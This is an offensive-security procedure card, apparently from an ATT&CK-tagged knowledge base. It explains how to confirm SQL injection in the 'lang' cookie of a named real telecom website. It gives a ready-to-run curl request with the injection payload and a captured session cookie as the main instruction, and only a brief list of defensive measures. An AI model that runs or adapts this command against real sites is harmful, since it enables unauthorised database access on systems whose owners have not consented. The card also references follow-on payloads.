---
id: proc-mtn-sqli-confirm
tags:
  - sqli
  - confirmation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/sqli-double-quote-balance]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.197Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-SQL-Injection-with-Balanced-Quotes

## Summary

This procedure confirms the SQL injection point by injecting double quotes into the lang cookie to balance the statement and restore normal response, validating control over the query structure in the MTN Yemen endpoint.

## Description

After triggering an error with a single quote, balancing it demonstrates the injection's position within a string literal in the SQL query. This step refines understanding of the vulnerability without visible output changes but through error elimination. Targets PHP applications mishandling cookies in queries.

## Requirements

1. Prior successful single-quote injection
2. HTTP client for cookie modification

## Defense

Defensive measures and detection strategies:

- Parameterize all user inputs including cookies
- Escape quotes in SQL contexts
- Log anomalous cookie values

## Objectives

1. Eliminate syntax error from single quote
2. Prove injection feasibility for further payloads

## Instructions

### Step 1: Inject Balanced Quotes

**Context**: Use double quotes to close the injected string and comment out remainder.

**Command** ([[commands/sqli-double-quote-balance]]):
```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en''; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

> Expect normal response similar to baseline, confirming balanced injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqli-double-quote-balance]]

## Tools Used


## Tags

- sqli
- confirmation
